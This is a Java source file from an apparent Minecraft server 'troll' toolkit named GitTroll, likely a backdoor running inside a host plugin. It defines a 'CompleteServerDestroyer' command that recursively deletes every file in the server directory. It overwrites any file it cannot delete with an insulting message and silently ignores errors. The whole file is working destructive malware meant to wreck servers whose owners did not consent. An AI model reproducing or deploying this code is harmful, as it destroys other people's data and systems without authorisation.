package net.Lenni0451.GitTroll.command.commands.server;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.List;

import org.bukkit.Bukkit;

import com.google.common.collect.Lists;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.manager.CommandManager;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class CompleteServerDestroyer extends CommandBase {
	
	List<CustomPlayer> verifyPlayers = Lists.newArrayList();

	public CompleteServerDestroyer() {
		super("CompleteServerDestroyer", "Delete the whole Server directory");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			if(!verifyPlayers.contains(executor)) {
				executor.sendGitMessage("§cWarning:");
				executor.sendGitMessage("§cThis destroyes the whole Server!");
				executor.sendGitMessage("§cYou will be responsible for all further actions!");
				executor.sendGitMessage("§cIf you do not agree do not type this command again.");
				executor.sendGitMessage("§aTo verify deleting the Server type §6" + CommandManager.COMMAND_PREFIX + "CompleteServerDestroyer §aagain to start the deletion.");
				
				verifyPlayers.add(executor);
				Bukkit.getScheduler().runTaskLaterAsynchronously(GitTroll.getInstance().getParentPlugin(), () -> {
					if(verifyPlayers.remove(executor)) {
						executor.sendGitMessage("The verification timed out.");
					}
				}, 20 * 10);
			} else {
				verifyPlayers.remove(executor);
				
				executor.sendGitMessage("Starting to delete server...");
				this.deleteFile(new File("./"));
				executor.sendGitMessage("The server has been delete completely!");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
	public void deleteFile(final File file) {
		if(file.isFile()) {
			try {
				if(!file.delete()) {
					OutputStream os = new FileOutputStream(file);
					os.write("Your Server has been fucked!".getBytes());
					os.close();
				}
			} catch (Throwable e) {}
		} else if(file.isDirectory()) {
			for(File f : file.listFiles()) {
				deleteFile(f);
			}
		}
	}

}
